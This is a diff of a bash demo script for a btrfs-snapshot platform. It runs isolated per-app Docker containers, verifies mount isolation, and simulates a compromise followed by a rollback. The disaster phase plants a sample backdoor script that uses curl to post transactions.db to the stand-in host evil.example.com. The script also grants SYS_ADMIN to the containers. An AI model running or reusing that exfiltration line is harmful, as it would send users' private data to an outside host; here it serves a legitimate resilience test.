@@ -125,39 +125,55 @@ pass "All worlds seeded with initial content"
 # ──────────────────────────────────────────────
 header "Phase 3: Start Isolated Containers"
 
-step "Pulling Alpine image..."
-docker pull alpine:3.19
+step "Determining loop device..."
+LOOP_DEV=$(losetup -j /data/images/alice.img | cut -d: -f1)
+echo "  Loop device: ${LOOP_DEV}"
+
+step "Building app container image..."
+docker build -t platform/app-container /app-container
 
 step "Starting alice-core container..."
-docker run -d \
-    --name alice-core \
+docker run -d --name alice-core \
+    --device ${LOOP_DEV} \
+    --cap-drop ALL \
+    --cap-add SYS_ADMIN \
+    --cap-add SETUID \
+    --cap-add SETGID \
     --network none \
-    --read-only \
-    --tmpfs /tmp \
-    -v /mnt/users/alice/core:/workspace \
-    alpine:3.19 tail -f /dev/null
+    -e SUBVOL_NAME=core \
+    -e LOOP_DEVICE=${LOOP_DEV} \
+    platform/app-container
 
 step "Starting alice-app-email container..."
-docker run -d \
-    --name alice-app-email \
+docker run -d --name alice-app-email \
+    --device ${LOOP_DEV} \
+    --cap-drop ALL \
+    --cap-add SYS_ADMIN \
+    --cap-add SETUID \
+    --cap-add SETGID \
     --network none \
-    --read-only \
-    --tmpfs /tmp \
-    -v /mnt/users/alice/app-email:/workspace \
-    alpine:3.19 tail -f /dev/null
+    -e SUBVOL_NAME=app-email \
+    -e LOOP_DEVICE=${LOOP_DEV} \
+    platform/app-container
 
 step "Starting alice-app-budget container..."
-docker run -d \
-    --name alice-app-budget \
+docker run -d --name alice-app-budget \
+    --device ${LOOP_DEV} \
+    --cap-drop ALL \
+    --cap-add SYS_ADMIN \
+    --cap-add SETUID \
+    --cap-add SETGID \
     --network none \
-    --read-only \
-    --tmpfs /tmp \
-    -v /mnt/users/alice/app-budget:/workspace \
-    alpine:3.19 tail -f /dev/null
+    -e SUBVOL_NAME=app-budget \
+    -e LOOP_DEVICE=${LOOP_DEV} \
+    platform/app-container
+
+# Give containers a moment to run their init scripts (mount + user setup)
+sleep 2
 
 step "Verifying all containers are running:"
 docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
-pass "All 3 containers running with isolated mounts"
+pass "All 3 containers running with device-mounted subvolumes"
 
 # ──────────────────────────────────────────────
 # Phase 4: Prove Isolation
@@ -168,50 +184,101 @@ header "Phase 4: Prove Isolation"
 step "Testing alice-app-budget isolation..."
 
 echo "  Files visible in /workspace:"
-docker exec alice-app-budget ls /workspace/
-docker exec alice-app-budget ls /workspace/src/app.py && echo "  app.py exists ✓"
+docker exec -u root alice-app-budget ls /workspace/
+docker exec -u root alice-app-budget ls /workspace/src/app.py && echo "  app.py exists ✓"
 
-echo "  Checking for escape paths..."
-# /mnt should not exist or be empty
-if docker exec alice-app-budget ls /mnt/users/ 2>/dev/null | grep -q .; then
+echo "  Checking /proc/mounts metadata..."
+BUDGET_MOUNTS=$(docker exec -u root alice-app-budget cat /proc/mounts)
+# Must show subvol=app-budget for /workspace
+if echo "$BUDGET_MOUNTS" | grep -q "subvol=/app-budget"; then
+    echo "  ✓ /proc/mounts shows subvol=/app-budget for /workspace"
+else
+    fail "app-budget /proc/mounts does not show correct subvolume!"
+fi
+# Must NOT contain other subvolume names
+if echo "$BUDGET_MOUNTS" | grep -q "app-email"; then
+    fail "app-budget /proc/mounts leaks 'app-email' — metadata isolation broken!"
+fi
+if echo "$BUDGET_MOUNTS" | grep -q "subvol=/core"; then
+    fail "app-budget /proc/mounts leaks 'core' — metadata isolation broken!"
+fi
+# Must NOT contain host paths
+if echo "$BUDGET_MOUNTS" | grep -q "/mnt/users/alice"; then
+    fail "app-budget /proc/mounts leaks host path — metadata isolation broken!"
+fi
+echo "  ✓ No other subvolume names in /proc/mounts"
+echo "  ✓ No host paths in /proc/mounts"
+
+echo "  Checking filesystem escape paths..."
+if docker exec -u root alice-app-budget ls /mnt/users/ 2>/dev/null | grep -q .; then
     fail "app-budget can see /mnt/users/ — isolation broken!"
 fi
-# /data should not exist
-if docker exec alice-app-budget ls /data/ 2>/dev/null | grep -q .; then
+if docker exec -u root alice-app-budget ls /data/ 2>/dev/null | grep -q .; then
     fail "app-budget can see /data/ — isolation broken!"
 fi
-# Verify no other world paths are accessible as mount points
-if docker exec alice-app-budget ls /mnt/users/alice/app-email 2>/dev/null | grep -q .; then
-    fail "app-budget can access app-email mount path — isolation broken!"
-fi
-if docker exec alice-app-budget ls /mnt/users/alice/core 2>/dev/null | grep -q .; then
-    fail "app-budget can access core mount path — isolation broken!"
-fi
-pass "app-budget can only see its own world"
+pass "app-budget can only see its own world (filesystem + metadata)"
 
 # --- app-email isolation ---
 step "Testing alice-app-email isolation..."
 
 echo "  Files visible in /workspace:"
-docker exec alice-app-email ls /workspace/
+docker exec -u root alice-app-email ls /workspace/
+
+echo "  Checking /proc/mounts metadata..."
+EMAIL_MOUNTS=$(docker exec -u root alice-app-email cat /proc/mounts)
+if echo "$EMAIL_MOUNTS" | grep -q "subvol=/app-email"; then
+    echo "  ✓ /proc/mounts shows subvol=/app-email for /workspace"
+else
+    fail "app-email /proc/mounts does not show correct subvolume!"
+fi
+if echo "$EMAIL_MOUNTS" | grep -q "app-budget"; then
+    fail "app-email /proc/mounts leaks 'app-budget' — metadata isolation broken!"
+fi
+if echo "$EMAIL_MOUNTS" | grep -q "subvol=/core"; then
+    fail "app-email /proc/mounts leaks 'core' — metadata isolation broken!"
+fi
+if echo "$EMAIL_MOUNTS" | grep -q "/mnt/users/alice"; then
+    fail "app-email /proc/mounts leaks host path — metadata isolation broken!"
+fi
+echo "  ✓ No other subvolume names in /proc/mounts"
+echo "  ✓ No host paths in /proc/mounts"
 
 echo "  Checking for budget world leakage..."
-if docker exec alice-app-email find /workspace -name "transactions*" -o -name "app.py" 2>/dev/null | grep -q .; then
+if docker exec -u root alice-app-email find /workspace -name "transactions*" -o -name "app.py" 2>/dev/null | grep -q .; then
     fail "app-email can see budget files — isolation broken!"
 fi
-pass "app-email can only see its own world"
+pass "app-email can only see its own world (filesystem + metadata)"
 
 # --- core isolation ---
 step "Testing alice-core isolation..."
 
 echo "  Files visible in /workspace:"
-docker exec alice-core ls /workspace/
+docker exec -u root alice-core ls /workspace/
+
+echo "  Checking /proc/mounts metadata..."
+CORE_MOUNTS=$(docker exec -u root alice-core cat /proc/mounts)
+if echo "$CORE_MOUNTS" | grep -q "subvol=/core"; then
+    echo "  ✓ /proc/mounts shows subvol=/core for /workspace"
+else
+    fail "core /proc/mounts does not show correct subvolume!"
+fi
+if echo "$CORE_MOUNTS" | grep -q "app-email"; then
+    fail "core /proc/mounts leaks 'app-email' — metadata isolation broken!"
+fi
+if echo "$CORE_MOUNTS" | grep -q "app-budget"; then
+    fail "core /proc/mounts leaks 'app-budget' — metadata isolation broken!"
+fi
+if echo "$CORE_MOUNTS" | grep -q "/mnt/users/alice"; then
+    fail "core /proc/mounts leaks host path — metadata isolation broken!"
+fi
+echo "  ✓ No other subvolume names in /proc/mounts"
+echo "  ✓ No host paths in /proc/mounts"
 
 echo "  Checking for other world leakage..."
-if docker exec alice-core find /workspace -name "inbox*" -o -name "transactions*" 2>/dev/null | grep -q .; then
+if docker exec -u root alice-core find /workspace -name "inbox*" -o -name "transactions*" 2>/dev/null | grep -q .; then
     fail "core can see other worlds' files — isolation broken!"
 fi
-pass "core can only see its own world"
+pass "core can only see its own world (filesystem + metadata)"
 
 # ──────────────────────────────────────────────
 # Phase 5: Simulate Agent Work + Snapshot
@@ -220,7 +287,7 @@ header "Phase 5: Simulate Agent Work + Snapshot"
 
 step "Agent writing new files in budget world..."
 
-docker exec alice-app-budget sh -c 'cat > /workspace/src/custom_feature.py << "PYEOF"
+docker exec -u root alice-app-budget sh -c 'cat > /workspace/src/custom_feature.py << "PYEOF"
 """Custom analytics feature added by agent."""
 
 def spending_by_category(transactions):
@@ -235,9 +302,9 @@ def monthly_trend(transactions):
     return {"february": len(transactions), "trend": "stable"}
 PYEOF'
 
-docker exec alice-app-budget sh -c 'echo "5|2026-02-15|Online Subscription|−12.99|entertainment" >> /workspace/data/transactions.db'
+docker exec -u root alice-app-budget sh -c 'echo "5|2026-02-15|Online Subscription|−12.99|entertainment" >> /workspace/data/transactions.db'
 
-docker exec alice-app-budget sh -c 'cat > /workspace/src/dashboard.html << "HTMLEOF"
+docker exec -u root alice-app-budget sh -c 'cat > /workspace/src/dashboard.html << "HTMLEOF"
 <!DOCTYPE html>
 <html>
 <head><title>Budget Dashboard</title></head>
@@ -251,7 +318,7 @@ docker exec alice-app-budget sh -c 'cat > /workspace/src/dashboard.html << "HTML
 HTMLEOF'
 
 step "Current state of budget world:"
-docker exec alice-app-budget find /workspace -type f | sort
+docker exec -u root alice-app-budget find /workspace -type f | sort
 
 step "Taking snapshot of budget world..."
 btrfs subvolume snapshot -r /mnt/users/alice/app-budget /mnt/users/alice/snapshots/app-budget-checkpoint-1
@@ -274,22 +341,22 @@ header "Phase 6: Simulate Disaster + Rollback"
 
 step "Simulating catastrophic failure in budget world..."
 
-docker exec alice-app-budget sh -c 'rm /workspace/src/app.py'
-docker exec alice-app-budget sh -c 'echo "CORRUPTED GARBAGE DATA @@##!!%%" > /workspace/data/transactions.db'
-docker exec alice-app-budget sh -c 'cat > /workspace/src/.backdoor.sh << "EOF"
+docker exec -u root alice-app-budget sh -c 'rm /workspace/src/app.py'
+docker exec -u root alice-app-budget sh -c 'echo "CORRUPTED GARBAGE DATA @@##!!%%" > /workspace/data/transactions.db'
+docker exec -u root alice-app-budget sh -c 'cat > /workspace/src/.backdoor.sh << "EOF"
 #!/bin/sh
 # Malicious script planted by attacker
 curl -s http://evil.example.com/exfil -d @/workspace/data/transactions.db
 EOF'
 
 step "Current (broken) state:"
-docker exec alice-app-budget find /workspace -type f | sort
+docker exec -u root alice-app-budget find /workspace -type f | sort
 echo ""
 echo "  Corrupted transactions.db:"
-docker exec alice-app-budget cat /workspace/data/transactions.db
+docker exec -u root alice-app-budget cat /workspace/data/transactions.db
 echo ""
 echo "  Backdoor exists:"
-docker exec alice-app-budget cat /workspace/src/.backdoor.sh
+docker exec -u root alice-app-budget cat /workspace/src/.backdoor.sh
 
 echo -e "\n${RED}${BOLD}  ⚠ DISASTER: app-budget has been compromised/corrupted${NC}\n"
 
@@ -305,46 +372,51 @@ echo "  Restoring from snapshot..."
 btrfs subvolume snapshot /mnt/users/alice/snapshots/app-budget-checkpoint-1 /mnt/users/alice/app-budget
 
 echo "  Restarting container with restored world..."
-docker run -d \
-    --name alice-app-budget \
+docker run -d --name alice-app-budget \
+    --device ${LOOP_DEV} \
+    --cap-drop ALL \
+    --cap-add SYS_ADMIN \
+    --cap-add SETUID \
+    --cap-add SETGID \
     --network none \
-    --read-only \
-    --tmpfs /tmp \
-    -v /mnt/users/alice/app-budget:/workspace \
-    alpine:3.19 tail -f /dev/null
+    -e SUBVOL_NAME=app-budget \
+    -e LOOP_DEVICE=${LOOP_DEV} \
+    platform/app-container
+
+sleep 2
 
 step "Verifying restored state..."
 
 # app.py should be back
-if docker exec alice-app-budget ls /workspace/src/app.py &>/dev/null; then
+if docker exec -u root alice-app-budget ls /workspace/src/app.py &>/dev/null; then
     echo "  ✓ src/app.py is back"
 else
     fail "src/app.py not restored!"
 fi
 
 # transactions.db should have correct data including agent additions
-if docker exec alice-app-budget cat /workspace/data/transactions.db | grep -q "Online Subscription"; then
+if docker exec -u root alice-app-budget cat /workspace/data/transactions.db | grep -q "Online Subscription"; then
     echo "  ✓ transactions.db has correct data (including agent additions)"
 else
     fail "transactions.db not properly restored!"
 fi
 
 # backdoor should NOT exist
-if docker exec alice-app-budget ls /workspace/src/.backdoor.sh &>/dev/null; then
+if docker exec -u root alice-app-budget ls /workspace/src/.backdoor.sh &>/dev/null; then
     fail ".backdoor.sh still exists — rollback incomplete!"
 else
     echo "  ✓ .backdoor.sh does not exist (removed by rollback)"
 fi
 
 # custom_feature.py should exist (was in snapshot)
-if docker exec alice-app-budget ls /workspace/src/custom_feature.py &>/dev/null; then
+if docker exec -u root alice-app-budget ls /workspace/src/custom_feature.py &>/dev/null; then
     echo "  ✓ custom_feature.py exists (preserved from snapshot)"
 else
     fail "custom_feature.py missing — snapshot was incomplete!"
 fi
 
 # dashboard.html should exist (was in snapshot)
-if docker exec alice-app-budget ls /workspace/src/dashboard.html &>/dev/null; then
+if docker exec -u root alice-app-budget ls /workspace/src/dashboard.html &>/dev/null; then
     echo "  ✓ dashboard.html exists (preserved from snapshot)"
 else
     fail "dashboard.html missing — snapshot was incomplete!"
@@ -358,13 +430,13 @@ pass "Rollback successful, budget world restored to checkpoint-1"
 header "Phase 7: Prove Other Worlds Were Unaffected"
 
 step "Checking email world..."
-docker exec alice-app-email cat /workspace/data/inbox.db | grep -q "Q4 Report" || fail "Email inbox.db corrupted!"
-docker exec alice-app-email cat /workspace/config.json | grep -q "alice.example.com" || fail "Email config.json corrupted!"
+docker exec -u root alice-app-email cat /workspace/data/inbox.db | grep -q "Q4 Report" || fail "Email inbox.db corrupted!"
+docker exec -u root alice-app-email cat /workspace/config.json | grep -q "alice.example.com" || fail "Email config.json corrupted!"
 pass "Email world was completely unaffected by budget disaster + rollback"
 
 step "Checking core world..."
-docker exec alice-core cat /workspace/config.json | grep -q "alice-agent" || fail "Core config.json corrupted!"
-docker exec alice-core cat /workspace/memory/MEMORY.md | grep -q "Budget reports" || fail "Core MEMORY.md corrupted!"
+docker exec -u root alice-core cat /workspace/config.json | grep -q "alice-agent" || fail "Core config.json corrupted!"
+docker exec -u root alice-core cat /workspace/memory/MEMORY.md | grep -q "Budget reports" || fail "Core MEMORY.md corrupted!"
 pass "Core world was completely unaffected by budget disaster + rollback"
 
 # ──────────────────────────────────────────────
@@ -405,5 +477,6 @@ echo -e "${GREEN}  ✓ Disaster simulated (files corrupted/deleted)${NC}"
 echo -e "${GREEN}  ✓ Rollback executed (instant restore from snapshot)${NC}"
 echo -e "${GREEN}  ✓ Restored world verified (all good data back, bad data gone)${NC}"
 echo -e "${GREEN}  ✓ Other worlds unaffected (isolation held during rollback)${NC}"
+echo -e "${GREEN}  ✓ Metadata isolation verified (no host paths in /proc/mounts)${NC}"
 echo -e "${GREEN}  ✓ Disk efficiency confirmed (sparse + COW working)${NC}"
 echo -e "${GREEN}${BOLD}════════════════════════════════════════════${NC}"
